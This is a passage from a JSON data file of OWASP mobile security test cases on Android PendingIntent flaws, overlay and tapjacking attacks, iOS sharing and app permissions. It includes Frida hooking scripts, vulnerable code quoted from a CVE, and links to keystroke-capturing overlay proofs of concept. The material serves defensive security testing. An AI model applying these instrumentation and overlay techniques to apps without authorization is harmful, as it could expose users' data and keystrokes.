        "sort_order": 62
    },
    {
        "tags":
        [
            "MASTG-TEST-0030: Testing for Vulnerable Implementation of PendingIntent"
        ],
        "testcase": "Testing for Vulnerable Implementation of PendingIntent",
        "details": "<h2>Overview</h2><p>When testing <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#pending-intents\" rel=\"noopener noreferrer\" target=\"_blank\">Pending Intents</a> you must ensure that they are immutable and that the app explicitly specifies the exact package, action, and component that will receive the base intent.</p><h2></h2><h2>Static Analysis</h2><p>To identify vulnerable implementations, static analysis can be performed by looking for API calls used for obtaining a PendingIntent. Such APIs are listed below:</p><pre>PendingIntent getActivity(Context, int, Intent, int)\nPendingIntent getActivity(Context, int, Intent, int, Bundle)\nPendingIntent getActivities(Context, int, Intent, int, Bundle)\nPendingIntent getActivities(Context, int, Intent, int)\nPendingIntent getForegroundService(Context, int, Intent, int)\nPendingIntent getService(Context, int, Intent, int)\n</pre><p>Once any of the above function is spotted, check the implementation of the base intent and the PendingIntent for the security pitfalls listed in the <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#pending-intents\" rel=\"noopener noreferrer\" target=\"_blank\">Pending Intents</a> section.</p><p>For example, in <a href=\"https://android.googlesource.com/platform/frameworks/base/+/6ae2bd0e59636254c32896f7f01379d1d704f42d\" rel=\"noopener noreferrer\" target=\"_blank\">A-156959408 ↗</a>(CVE-2020-0389), the base intent is implicit and also the PendingIntent is mutable, thus making it exploitable.</p><pre>private Notification createSaveNotification(Uri uri) {\n    Intent viewIntent = new Intent(Intent.ACTION_VIEW)\n            .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION)\n            .setDataAndType(uri, \"video/mp4\"); //Implicit Intent\n\n//... skip ...\n\nNotification.Builder builder = new Notification.Builder(this, CHANNEL_ID)\n                .setSmallIcon(R.drawable.ic_android)\n                .setContentTitle(getResources().getString(R.string.screenrecord_name))\n                .setContentText(getResources().getString(R.string.screenrecord_save_message))\n                .setContentIntent(PendingIntent.getActivity(\n                        this,\n                        REQUEST_CODE,\n                        viewIntent,\n                        Intent.FLAG_GRANT_READ_URI_PERMISSION))     // Mutable PendingIntent.\n                .addAction(shareAction)\n                .addAction(deleteAction)\n                .setAutoCancel(true);\n</pre><h2></h2><h2>Dynamic Analysis</h2><p>Frida can be used to hook the APIs used to get a PendingIntent. This information can be used to determine the code location of the call, which can be further used to perform static analysis as described above.</p><p>Here's an example of such a Frida script that can be used to hook the PendingIntent.getActivity function:</p><pre>var pendingIntent = Java.use('android.app.PendingIntent');\n\nvar getActivity_1 = pendingIntent.getActivity.overload(\"android.content.Context\", \"int\", \"android.content.Intent\", \"int\");\n\ngetActivity_1.implementation = function(context, requestCode, intent, flags){\n    console.log(\"[*] Calling PendingIntent.getActivity(\"+intent.getAction()+\")\");\n    console.log(\"\\t[-] Base Intent toString: \" + intent.toString());\n    console.log(\"\\t[-] Base Intent getExtras: \" + intent.getExtras());\n    console.log(\"\\t[-] Base Intent getFlags: \" + intent.getFlags());\n    return this.getActivity(context, requestCode, intent, flags);\n}\n</pre><p>This approach can be helpful when dealing with applications with large code bases, where determining the control flow can sometimes be tricky.</p>",
        "code": "MASTG-TEST-0030",
        "sort_order": 64
    },
    {
        "tags":
        [
            "MASTG-TEST-0035: Testing for Overlay Attacks"
        ],
        "testcase": "Testing for Overlay Attacks",
        "details": "<h2>Overview</h2><ul><li>To test for <a href=\"https://mas.owasp.org/MASTG/0x05h-Testing-Platform-Interaction/#overlay-attacks\" rel=\"noopener noreferrer\" target=\"_blank\">overlay attacks</a> you need to check the app for usage of certain APIs and attributed typically used to protect against overlay attacks as well as check the Android version that app is targeting.</li><li>To mitigate these attacks please carefully read the general guidelines about Android View security in the <a href=\"https://developer.android.com/reference/android/view/View#security\" rel=\"noopener noreferrer\" target=\"_blank\">Android Developer Documentation ↗</a>. For instance, the so-called <em>touch filtering</em> is a common defense against tapjacking, which contributes to safeguarding users against these vulnerabilities, usually in combination with other techniques and considerations as we introduce in this section.</li></ul><h2></h2><h2>Static Analysis</h2><ul><li>To start your static analysis you can check the app for the following methods and attributes (non-exhaustive list):<ul><li>Override <a href=\"https://developer.android.com/reference/android/view/View#onFilterTouchEventForSecurity%28android.view.MotionEvent%29\" rel=\"noopener noreferrer\" target=\"_blank\">onFilterTouchEventForSecurity ↗</a> for more fine-grained control and to implement a custom security policy for views.</li><li>Set the layout attribute <a href=\"https://developer.android.com/reference/android/view/View#attr_android:filterTouchesWhenObscured\" rel=\"noopener noreferrer\" target=\"_blank\">android:filterTouchesWhenObscured ↗</a> to true or call <a href=\"https://developer.android.com/reference/android/view/View.html#setFilterTouchesWhenObscured%28boolean%29\" rel=\"noopener noreferrer\" target=\"_blank\">setFilterTouchesWhenObscured ↗</a>.</li><li>Check <a href=\"https://developer.android.com/reference/android/view/MotionEvent.html#FLAG_WINDOW_IS_OBSCURED\" rel=\"noopener noreferrer\" target=\"_blank\">FLAG_WINDOW_IS_OBSCURED ↗</a> (since API level 9) or <a href=\"https://developer.android.com/reference/android/view/MotionEvent.html#FLAG_WINDOW_IS_PARTIALLY_OBSCURED\" rel=\"noopener noreferrer\" target=\"_blank\">FLAG_WINDOW_IS_PARTIALLY_OBSCURED ↗</a> (starting on API level 29).</li></ul></li><li>Some attributes might affect the app as a whole, while others can be applied to specific components. The latter would be the case when, for example, there is a business need to specifically allow overlays while wanting to protect sensitive input UI elements. The developers might also take additional precautions to confirm the user's actual intent which might be legitimate and tell it apart from a potential attack.</li><li>As a final note, always remember to properly check the API level that app is targeting and the implications that this has. For instance, <a href=\"https://developer.android.com/about/versions/oreo/android-8.0-changes#all-aw\" rel=\"noopener noreferrer\" target=\"_blank\">Android 8.0 (API level 26) introduced changes ↗</a> to apps requiring SYSTEM_ALERT_WINDOW (\"draw on top\"). From this API level on, apps using TYPE_APPLICATION_OVERLAY will be always <a href=\"https://developer.android.com/about/versions/oreo/android-8.0-changes#all-aw\" rel=\"noopener noreferrer\" target=\"_blank\">shown above other windows ↗</a> having other types such as TYPE_SYSTEM_OVERLAY or TYPE_SYSTEM_ALERT. You can use this information to ensure that no overlay attacks may occur at least for this app in this concrete Android version.</li></ul><h2></h2><h2>Dynamic Analysis</h2><ul><li>Abusing this kind of vulnerability on a dynamic manner can be pretty challenging and very specialized as it closely depends on the target Android version. For instance, for versions up to Android 7.0 (API level 24) you can use the following APKs as a proof of concept to identify the existence of the vulnerabilities.<ul><li><a href=\"https://github.com/FSecureLABS/tapjacking-poc\" rel=\"noopener noreferrer\" target=\"_blank\">Tapjacking POC ↗</a>: This APK creates a simple overlay which sits on top of the testing application.</li><li><a href=\"https://github.com/DEVizzi/Invisible-Keyboard\" rel=\"noopener noreferrer\" target=\"_blank\">Invisible Keyboard ↗</a>: This APK creates multiple overlays on the keyboard to capture keystrokes. This is one of the exploit demonstrated in Cloak and Dagger attacks.</li></ul></li></ul>",
        "code": "MASTG-TEST-0035",
        "sort_order": 66
    },
    {
        "tags":
        [
            "MASTG-TEST-0071: Testing UIActivity Sharing"
        ],
        "testcase": "Testing UIActivity Sharing",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><h3>Sending Items</h3><p>When testing UIActivity Sharing you should pay special attention to:</p><ul><li>the data (items) being shared,</li><li>the custom activities,</li><li>the excluded activity types.</li></ul><p>Data sharing via UIActivity works by creating a UIActivityViewController and passing it the desired items (URLs, text, a picture) on <a href=\"https://developer.apple.com/documentation/uikit/uiactivityviewcontroller/1622019-init\" rel=\"noopener noreferrer\" target=\"_blank\">init(activityItems: applicationActivities:) ↗</a>.</p><p>As we mentioned before, it is possible to exclude some of the sharing mechanisms via the controller's <a href=\"https://developer.apple.com/documentation/uikit/uiactivityviewcontroller/1622009-excludedactivitytypes\" rel=\"noopener noreferrer\" target=\"_blank\">excludedActivityTypes property ↗</a>. It is highly recommended to do the tests using the latest versions of iOS as the number of activity types that can be excluded can increase. The developers have to be aware of this and <strong>explicitly exclude</strong> the ones that are not appropriate for the app data. Some activity types might not be even documented like \"Create Watch Face\".</p><p>If having the source code, you should take a look at the UIActivityViewController:</p><ul><li>Inspect the activities passed to the init(activityItems:applicationActivities:) method.</li><li>Check if it defines custom activities (also being passed to the previous method).</li><li>Verify the excludedActivityTypes, if any.</li></ul><p>If you only have the compiled/installed app, try searching for the previous method and property, for example using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0129\" rel=\"noopener noreferrer\" target=\"_blank\"> rabin2</a></em>:</p><pre>$ rabin2 -zq Telegram\\ X.app/Telegram\\ X | grep -i activityItems\n0x1000df034 45 44 initWithActivityItems:applicationActivities:\n</pre><h3>Receiving Items</h3><p>When receiving items, you should check:</p><ul><li>if the app declares <em>custom document types</em> by looking into Exported/Imported UTIs (\"Info\" tab of the Xcode project). The list of all system declared UTIs (Uniform Type Identifiers) can be found in the <a href=\"https://developer.apple.com/library/archive/documentation/Miscellaneous/Reference/UTIRef/Articles/System-DeclaredUniformTypeIdentifiers.html#//apple_ref/doc/uid/TP40009259\" rel=\"noopener noreferrer\" target=\"_blank\">archived Apple Developer Documentation ↗</a>.</li><li>if the app specifies any <em>document types that it can open</em> by looking into Document Types (\"Info\" tab of the Xcode project). If present, they consist of name and one or more UTIs that represent the data type (e.g. \"public.png\" for PNG files). iOS uses this to determine if the app is eligible to open a given document (specifying Exported/Imported UTIs is not enough).</li><li>if the app properly <em>verifies the received data</em> by looking into the implementation of <a href=\"https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623112-application?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">application:openURL:options: ↗</a> (or its deprecated version <a href=\"https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623073-application?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">UIApplicationDelegate application:openURL:sourceApplication:annotation: ↗</a>) in the app delegate.</li></ul><p>If not having the source code you can still take a look into the Info.plist file and search for:</p><ul><li>UTExportedTypeDeclarations/UTImportedTypeDeclarations if the app declares exported/imported <em>custom document types</em>.</li><li>CFBundleDocumentTypes to see if the app specifies any <em>document types that it can open</em>.</li></ul><p>A very complete explanation about the use of these keys can be found <a href=\"https://stackoverflow.com/questions/21937978/what-are-utimportedtypedeclarations-and-utexportedtypedeclarations-used-for-on-i\" rel=\"noopener noreferrer\" target=\"_blank\">on Stackoverflow ↗</a>.</p><p>Let's see a real-world example. We will take a File Manager app and take a look at these keys. We used <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0038\" rel=\"noopener noreferrer\" target=\"_blank\"> objection</a></em> here to read the Info.plist file.</p><pre>objection --gadget SomeFileManager run ios plist cat Info.plist\n</pre><p>Note that this is the same as if we would retrieve the IPA from the phone or accessed via e.g. SSH and navigated to the corresponding folder in the IPA / app sandbox. However, with objection we are just <em>one command away</em> from our goal and this can be still considered static analysis.</p><p>The first thing we noticed is that app does not declare any imported custom document types but we could find a couple of exported ones:</p><pre>UTExportedTypeDeclarations =     (\n            {\n        UTTypeConformsTo =             (\n            \"public.data\"\n        );\n        UTTypeDescription = \"SomeFileManager Files\";\n        UTTypeIdentifier = \"com.some.filemanager.custom\";\n        UTTypeTagSpecification =             {\n            \"public.filename-extension\" =                 (\n                ipa,\n                deb,\n                zip,\n                rar,\n                tar,\n                gz,\n                ...\n                key,\n                pem,\n                p12,\n                cer\n            );\n        };\n    }\n);\n</pre><p>The app also declares the document types it opens as we can find the key CFBundleDocumentTypes:</p><pre>CFBundleDocumentTypes =     (\n        {\n        ...\n        CFBundleTypeName = \"SomeFileManager Files\";\n        LSItemContentTypes =             (\n            \"public.content\",\n            \"public.data\",\n            \"public.archive\",\n            \"public.item\",\n            \"public.database\",\n            \"public.calendar-event\",\n            ...\n        );\n    }\n);\n</pre><p>We can see that this File Manager will try to open anything that conforms to any of the UTIs listed in LSItemContentTypes and it's ready to open files with the extensions listed in UTTypeTagSpecification/\"public.filename-extension\". Please take a note of this because it will be useful if you want to search for vulnerabilities when dealing with the different types of files when performing dynamic analysis.</p><h2></h2><h2>Dynamic Analysis</h2><h3>Sending Items</h3><p>There are three main things you can easily inspect by performing dynamic instrumentation:</p><ul><li>The activityItems: an array of the items being shared. They might be of different types, e.g. one string and one picture to be shared via a messaging app.</li><li>The applicationActivities: an array of UIActivity objects representing the app's custom services.</li><li>The excludedActivityTypes: an array of the Activity Types that are not supported, e.g. postToFacebook.</li></ul><p>To achieve this you can do two things:</p><ul><li>Hook the method we have seen in the static analysis (<a href=\"https://developer.apple.com/documentation/uikit/uiactivityviewcontroller/1622019-init\" rel=\"noopener noreferrer\" target=\"_blank\">init(activityItems: applicationActivities:) ↗</a>) to get the activityItems and applicationActivities.</li><li>Find out the excluded activities by hooking <a href=\"https://developer.apple.com/documentation/uikit/uiactivityviewcontroller/1622009-excludedactivitytypes\" rel=\"noopener noreferrer\" target=\"_blank\">excludedActivityTypes property ↗</a>.</li></ul><p>Let's see an example using Telegram to share a picture and a text file. First prepare the hooks, we will use the Frida REPL and write a script for this:</p><pre>Interceptor.attach(\nObjC.classes.\n    UIActivityViewController['- initWithActivityItems:applicationActivities:'].implementation, {\n  onEnter: function (args) {\n\n    printHeader(args)\n\n    this.initWithActivityItems = ObjC.Object(args[2]);\n    this.applicationActivities = ObjC.Object(args[3]);\n\n    console.log(\"initWithActivityItems: \" + this.initWithActivityItems);\n    console.log(\"applicationActivities: \" + this.applicationActivities);\n\n  },\n  onLeave: function (retval) {\n    printRet(retval);\n  }\n});\n\nInterceptor.attach(\nObjC.classes.UIActivityViewController['- excludedActivityTypes'].implementation, {\n  onEnter: function (args) {\n    printHeader(args)\n  },\n  onLeave: function (retval) {\n    printRet(retval);\n  }\n});\n\nfunction printHeader(args) {\n  console.log(Memory.readUtf8String(args[1]) + \" @ \" + args[1])\n};\n\nfunction printRet(retval) {\n  console.log('RET @ ' + retval + ': ' );\n  try {\n    console.log(new ObjC.Object(retval).toString());\n  } catch (e) {\n    console.log(retval.toString());\n  }\n};\n</pre><p>You can store this as a JavaScript file, e.g. inspect_send_activity_data.js and load it like this:</p><pre>frida -U Telegram -l inspect_send_activity_data.js\n</pre><p>Now observe the output when you first share a picture:</p><pre>[*] initWithActivityItems:applicationActivities: @ 0x18c130c07\ninitWithActivityItems: (\n    \"&lt;UIImage: 0x1c4aa0b40&gt; size {571, 264} orientation 0 scale 1.000000\"\n)\napplicationActivities: nil\nRET @ 0x13cb2b800:\n&lt;UIActivityViewController: 0x13cb2b800&gt;\n\n[*] excludedActivityTypes @ 0x18c0f8429\nRET @ 0x0:\nnil\n</pre><p>and then a text file:</p><pre>[*] initWithActivityItems:applicationActivities: @ 0x18c130c07\ninitWithActivityItems: (\n    \"&lt;QLActivityItemProvider: 0x1c4a30140&gt;\",\n    \"&lt;UIPrintInfo: 0x1c0699a50&gt;\"\n)\napplicationActivities: (\n)\nRET @ 0x13c4bdc00:\n&lt;_UIDICActivityViewController: 0x13c4bdc00&gt;\n\n[*] excludedActivityTypes @ 0x18c0f8429\nRET @ 0x1c001b1d0:\n(\n    \"com.apple.UIKit.activity.MarkupAsPDF\"\n)\n</pre><p>You can see that:</p><ul><li>For the picture, the activity item is a UIImage and there are no excluded activities.</li><li>For the text file there are two different activity items and com.apple.UIKit.activity. MarkupAsPDF is excluded.</li></ul><p>In the previous example, there were no custom applicationActivities and only one excluded activity. However, to better illustrate what you can expect from other apps we have shared a picture using another app, here you can see a bunch of application activities and excluded activities (output was edited to hide the name of the originating app):</p><pre>[*] initWithActivityItems:applicationActivities: @ 0x18c130c07\ninitWithActivityItems: (\n    \"&lt;SomeActivityItemProvider: 0x1c04bd580&gt;\"\n)\napplicationActivities: (\n    \"&lt;SomeActionItemActivityAdapter: 0x141de83b0&gt;\",\n    \"&lt;SomeActionItemActivityAdapter: 0x147971cf0&gt;\",\n    \"&lt;SomeOpenInSafariActivity: 0x1479f0030&gt;\",\n    \"&lt;SomeOpenInChromeActivity: 0x1c0c8a500&gt;\"\n)\nRET @ 0x142138a00:\n&lt;SomeActivityViewController: 0x142138a00&gt;\n\n[*] excludedActivityTypes @ 0x18c0f8429\nRET @ 0x14797c3e0:\n(\n    \"com.apple.UIKit.activity.Print\",\n    \"com.apple.UIKit.activity.AssignToContact\",\n    \"com.apple.UIKit.activity.SaveToCameraRoll\",\n    \"com.apple.UIKit.activity.CopyToPasteboard\",\n)\n</pre><h3>Receiving Items</h3><p>After performing the static analysis you would know the <em>document types that the app can open</em> and <em>if it declares any custom document types</em> and (part of) the methods involved. You can use this now to test the receiving part:</p><ul><li><em>Share</em> a file with the app from another app or send it via AirDrop or e-mail. Choose the file so that it will trigger the \"Open with...\" dialogue (that is, there is no default app that will open the file, a PDF for example).</li><li>Hook application:openURL:options: and any other methods that were identified in a previous static analysis.</li><li>Observe the app behavior.</li><li>In addition, you could send specific malformed files and/or use a fuzzing technique.</li></ul><p>To illustrate this with an example we have chosen the same real-world file manager app from the static analysis section and followed these steps:</p><ol><li>Send a PDF file from another Apple device (e.g. a MacBook) via Airdrop.</li><li>Wait for the <strong>AirDrop</strong> popup to appear and click on <strong>Accept</strong>.</li><li>As there is no default app that will open the file, it switches to the <strong>Open with...</strong> popup. There, we can select the app that will open our file. The next screenshot shows this (we have modified the display name using Frida to conceal the app's real name):</li><li></li><li>After selecting <strong>SomeFileManager</strong> we can see the following:</li></ol><pre>(0x1c4077000)  -[AppDelegate application:openURL:options:]\napplication: &lt;UIApplication: 0x101c00950&gt;\nopenURL: file:///var/mobile/Library/Application%20Support\n                    /Containers/com.some.filemanager/Documents/Inbox/OWASP_MASVS.pdf\noptions: {\n    UIApplicationOpenURLOptionsAnnotationKey =     {\n        LSMoveDocumentOnOpen = 1;\n    };\n    UIApplicationOpenURLOptionsOpenInPlaceKey = 0;\n    UIApplicationOpenURLOptionsSourceApplicationKey = \"com.apple.sharingd\";\n    \"_UIApplicationOpenURLOptionsSourceProcessHandleKey\" = \"&lt;FBSProcessHandle: 0x1c3a63140;\n                                                                sharingd:605; valid: YES&gt;\";\n}\n0x18c7930d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke\n...\n0x1857cdc34 FrontBoardServices!-[FBSSerialQueue _performNextFromRunLoopSource]\nRET: 0x1\n</pre><p>As you can see, the sending application is com.apple.sharingd and the URL's scheme is file://. Note that once we select the app that should open the file, the system already moved the file to the corresponding destination, that is to the app's Inbox. The apps are then responsible for deleting the files inside their Inboxes. This app, for example, moves the file to /var/mobile/Documents/ and removes it from the Inbox.</p><pre>(0x1c002c760)  -[XXFileManager moveItemAtPath:toPath:error:]\nmoveItemAtPath: /var/mobile/Library/Application Support/Containers\n                            /com.some.filemanager/Documents/Inbox/OWASP_MASVS.pdf\ntoPath: /var/mobile/Documents/OWASP_MASVS (1).pdf\nerror: 0x16f095bf8\n0x100f24e90 SomeFileManager!-[AppDelegate __handleOpenURL:]\n0x100f25198 SomeFileManager!-[AppDelegate application:openURL:options:]\n0x18c7930d8 UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke\n...\n0x1857cd9f4 FrontBoardServices!__FBSSERIALQUEUE_IS_CALLING_OUT_TO_A_BLOCK__\nRET: 0x1\n</pre><p>If you look at the stack trace, you can see how application:openURL:options: called __handleOpenURL:, which called moveItemAtPath:toPath:error:. Notice that we have now this information without having the source code for the target app. The first thing that we had to do was clear: hook application:openURL:options:. Regarding the rest, we had to think a little bit and come up with methods that we could start tracing and are related to the file manager, for example, all methods containing the strings \"copy\", \"move\", \"remove\", etc. until we have found that the one being called was moveItemAtPath:toPath:error:.</p><p>A final thing worth noticing here is that this way of handling incoming files is the same for custom URL schemes. Please refer to <em><a href=\"https://mas.owasp.org/MASTG-TEST-0075\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing Custom URL Schemes</a></em> for more information.</p>",
        "code": "MASTG-TEST-0071",
        "sort_order": 78
    },
    {
        "tags":
        [
            "MASTG-TEST-0069: Testing App Permissions"
        ],
        "testcase": "Testing App Permissions",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>Since iOS 10, these are the main areas which you need to inspect for permissions:</p><ul><li>Purpose Strings in the Info.plist File</li><li>Code Signing Entitlements File</li><li>Embedded Provisioning Profile File</li><li>Entitlements Embedded in the Compiled App Binary</li><li>Usage of Permissions in Source Code</li></ul><h3>Purpose Strings in the Info.plist File</h3><p>If having the original source code, you can verify the permissions included in the Info.plist file:</p><ul><li>Open the project with Xcode.</li><li>Find and open the Info.plist file in the default editor and search for the keys starting with \"Privacy -\".</li></ul><p>You may switch the view to display the raw values by right-clicking and selecting \"Show Raw Keys/Values\" (this way for example \"Privacy - Location When In Use Usage Description\" will turn into NSLocationWhenInUseUsageDescription).</p><p>If only having the IPA:</p><ul><li>Unzip the IPA.</li><li>The Info.plist is located in Payload/&lt;appname&gt;.app/Info.plist.</li><li>Convert it if needed (e.g. plutil -convert xml1 Info.plist) as explained in the chapter \"iOS Basic Security Testing\", section \"The Info.plist File\".</li><li>Inspect all <em>purpose strings Info.plist keys</em>, usually ending with UsageDescription:</li></ul><pre>&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n    &lt;key&gt;NSLocationWhenInUseUsageDescription&lt;/key&gt;\n    &lt;string&gt;Your location is used to provide turn-by-turn directions to your destination.&lt;/string&gt;\n</pre><p>For each purpose string in the Info.plist file, check if the permission makes sense.</p><p>For example, imagine the following lines were extracted from a Info.plist file used by a Solitaire game:</p><pre>&lt;key&gt;NSHealthClinicalHealthRecordsShareUsageDescription&lt;/key&gt;\n&lt;string&gt;Share your health data with us!&lt;/string&gt;\n&lt;key&gt;NSCameraUsageDescription&lt;/key&gt;\n&lt;string&gt;We want to access your camera&lt;/string&gt;\n</pre><p>It should be suspicious that a regular solitaire game requests this kind of resource access as it probably does not have any need for <a href=\"https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html#//apple_ref/doc/uid/TP40009251-SW24\" rel=\"noopener noreferrer\" target=\"_blank\">accessing the camera ↗</a> nor a <a href=\"https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Articles/CocoaKeys.html#//apple_ref/doc/uid/TP40009251-SW76\" rel=\"noopener noreferrer\" target=\"_blank\">user's health-records ↗</a>.</p><p>Apart from simply checking if the permissions make sense, further analysis steps might be derived from analyzing purpose strings e.g. if they are related to storage sensitive data. For example, NSPhotoLibraryUsageDescription can be considered as a storage permission giving access to files that are outside of the app's sandbox and might also be accessible by other apps. In this case, it should be tested that no sensitive data is being stored there (photos in this case). For other purpose strings like NSLocationAlwaysUsageDescription, it must be also considered if the app is storing this data securely. Refer to the \"Testing Data Storage\" chapter for more information and best practices on securely storing sensitive data.</p><h3>Embedded Provisioning Profile File</h3><p>When you do not have the original source code, you should analyze the IPA and search inside for the <em>embedded provisioning profile</em> that is usually located in the root app bundle folder (Payload/&lt;appname&gt;.app/) under the name embedded.mobileprovision.</p><p>This file is not a .plist, it is encoded using <a href=\"https://en.wikipedia.org/wiki/Cryptographic_Message_Syntax\" rel=\"noopener noreferrer\" target=\"_blank\">Cryptographic Message Syntax ↗</a>. On macOS you can <a href=\"https://developer.apple.com/library/archive/technotes/tn2415/_index.html#//apple_ref/doc/uid/DTS40016427-CH1-PROFILESENTITLEMENTS\" rel=\"noopener noreferrer\" target=\"_blank\">inspect an embedded provisioning profile's entitlements ↗</a> using the following command:</p><pre>security cms -D -i embedded.mobileprovision\n</pre><p>and then search for the Entitlements key region (&lt;key&gt;Entitlements&lt;/key&gt;).</p><h3>Entitlements Embedded in the Compiled App Binary</h3><p>If you only have the app's IPA or simply the installed app on a jailbroken device, you normally won't be able to find .entitlements files. This could also be the case for the embedded.mobileprovision file. Still, you should be able to extract the entitlements property lists from the app binary yourself (see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0111\" rel=\"noopener noreferrer\" target=\"_blank\"> Extracting Entitlements from MachO Binaries</a></em>).</p><h3>Usage of Permissions in Source Code</h3><p>After having checked the &lt;appname&gt;.entitlements file and the Info.plist file, it is time to verify how the requested permissions and assigned capabilities are put to use. For this, a source code review should be enough. However, if you don't have the original source code, verifying the use of permissions might be specially challenging as you might need to reverse engineer the app, refer to the \"Dynamic Analysis\" for more details on how to proceed.</p><p>When doing a source code review, pay attention to:</p><ul><li>whether the <em>purpose strings</em> in the Info.plist file match the programmatic implementations.</li><li>whether the registered capabilities are used in such a way that no confidential information is leaking.</li></ul><p>Users can grant or revoke authorization at any time via \"Settings\", therefore apps normally check the authorization status of a feature before accessing it. This can be done by using dedicated APIs available for many system frameworks that provide access to protected resources.</p><p>You can use the <a href=\"https://developer.apple.com/documentation/uikit/core_app/protecting_the_user_s_privacy/accessing_protected_resources?language=objc#3037319\" rel=\"noopener noreferrer\" target=\"_blank\">Apple Developer Documentation ↗</a> as a starting point. For example:</p><ul><li>Bluetooth: the <a href=\"https://developer.apple.com/documentation/corebluetooth/cbmanager/1648600-state?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">state ↗</a> property of the <a href=\"https://developer.apple.com/documentation/corebluetooth/cbcentralmanager?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">CBCentralManager ↗</a> class is used to check system-authorization status for using Bluetooth peripherals.</li><li>Location: search for methods of CLLocationManager, e.g. <a href=\"https://developer.apple.com/documentation/corelocation/cllocationmanager/1423648-locationservicesenabled?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">locationServicesEnabled ↗</a>.</li></ul><pre>func checkForLocationServices() {\n    if CLLocationManager.locationServicesEnabled() {\n        // Location services are available, so query the user’s location.\n    } else {\n        // Update your app’s UI to show that the location is unavailable.\n    }\n}\n</pre><ul><li>See Table1 in <a href=\"https://developer.apple.com/documentation/corelocation/adding_location_services_to_your_app\" rel=\"noopener noreferrer\" target=\"_blank\">\"Determining the Availability of Location Services\" ↗</a> (Apple Developer Documentation) for a complete list.</li></ul><p>Go through the application searching for usages of these APIs and check what happens to sensitive data that might be obtained from them. For example, it might be stored or transmitted over the network, if this is the case, proper data protection and transport security should be additionally verified.</p><h2></h2><h2>Dynamic Analysis</h2><p>With help of the static analysis you should already have a list of the included permissions and app capabilities in use. However, as mentioned in \"Source Code Inspection\", spotting the sensitive data and APIs related to those permissions and app capabilities might be a challenging task when you don't have the original source code. Dynamic analysis can help here getting inputs to iterate onto the static analysis.</p><p>Following an approach like the one presented below should help you spotting the mentioned sensitive data and APIs:</p><ol><li>Consider the list of permissions / capabilities identified in the static analysis (e.g. NSLocationWhenInUseUsageDescription).</li><li>Map them to the dedicated APIs available for the corresponding system frameworks (e.g. Core Location). You may use the <a href=\"https://developer.apple.com/documentation/uikit/core_app/protecting_the_user_s_privacy/accessing_protected_resources?language=objc#3037319\" rel=\"noopener noreferrer\" target=\"_blank\">Apple Developer Documentation ↗</a> for this.</li><li>Trace classes or specific methods of those APIs (e.g. CLLocationManager), for example, using <a href=\"https://www.frida.re/docs/frida-trace/\" rel=\"noopener noreferrer\" target=\"_blank\">frida-trace ↗</a>.</li><li>Identify which methods are being really used by the app while accessing the related feature (e.g. \"Share your location\").</li><li>Get a backtrace for those methods and try to build a call graph.</li></ol><p>Once all methods were identified, you might use this knowledge to reverse engineer the app and try to find out how the data is being handled. While doing that you might spot new methods involved in the process which you can again feed to step 3. above and keep iterating between static and dynamic analysis.</p><p>In the following example we use Telegram to open the share dialog from a chat and frida-trace to identify which methods are being called.</p><p>First we launch Telegram and start a trace for all methods matching the string \"authorizationStatus\" (this is a general approach because more classes apart from CLLocationManager implement this method):</p><pre>frida-trace -U \"Telegram\" -m \"*[* *authorizationStatus*]\"\n</pre><p>-U connects to the USB device. -m includes an Objective-C method to the traces. You can use a <a href=\"https://en.wikipedia.org/wiki/Glob_%28programming%29\" rel=\"noopener noreferrer\" target=\"_blank\">glob pattern ↗</a> (e.g. with the \"*\" wildcard, -m \"*[* *authorizationStatus*]\" means \"include any Objective-C method of any class containing 'authorizationStatus'\"). Type frida-trace -h for more information.</p><p>Now we open the share dialog:</p><p>The following methods are displayed:</p><pre>  1942 ms  +[PHPhotoLibrary authorizationStatus]\n  1959 ms  +[TGMediaAssetsLibrary authorizationStatusSignal]\n  1959 ms     | +[TGMediaAssetsModernLibrary authorizationStatusSignal]\n</pre><p>If we click on <strong>Location</strong>, another method will be traced:</p><pre> 11186 ms  +[CLLocationManager authorizationStatus]\n 11186 ms     | +[CLLocationManager _authorizationStatus]\n 11186 ms     |    | +[CLLocationManager _authorizationStatusForBundleIdentifier:0x0 bundle:0x0]\n</pre><p>Use the auto-generated stubs of frida-trace to get more information like the return values and a backtrace. Do the following modifications to the JavaScript file below (the path is relative to the current directory):</p><pre>// __handlers__/__CLLocationManager_authorizationStatus_.js\n\n  onEnter: function (log, args, state) {\n    log(\"+[CLLocationManager authorizationStatus]\");\n    log(\"Called from:\\n\" +\n        Thread.backtrace(this.context, Backtracer.ACCURATE)\n        .map(DebugSymbol.fromAddress).join(\"\\n\\t\") + \"\\n\");\n  },\n  onLeave: function (log, retval, state) {\n    console.log('RET :' + retval.toString());\n  }\n</pre><p>Clicking again on \"Location\" reveals more information:</p><pre>  3630 ms  -[CLLocationManager init]\n  3630 ms     | -[CLLocationManager initWithEffectiveBundleIdentifier:0x0 bundle:0x0]\n  3634 ms  -[CLLocationManager setDelegate:0x14c9ab000]\n  3641 ms  +[CLLocationManager authorizationStatus]\nRET: 0x4\n  3641 ms  Called from:\n0x1031aa158 TelegramUI!+[TGLocationUtils requestWhenInUserLocationAuthorizationWithLocationManager:]\n    0x10337e2c0 TelegramUI!-[TGLocationPickerController initWithContext:intent:]\n    0x101ee93ac TelegramUI!0x1013ac\n</pre><p>We see that 